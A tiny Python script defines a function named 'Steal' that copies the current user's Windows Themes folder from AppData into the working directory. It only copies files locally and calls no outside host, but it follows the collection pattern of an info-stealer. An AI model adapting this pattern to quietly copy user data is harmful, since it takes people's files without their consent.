import shutil
import os
import os
import sys
dwc = os.getcwd()
username = os.getlogin()
def Steal():
    src = fr"C:\Users\{username}\AppData\Local\Microsoft\Windows\Themes"
    dst = fr"{dwc}\Themes"
    shutil.copytree(src, dst, dirs_exist_ok=True)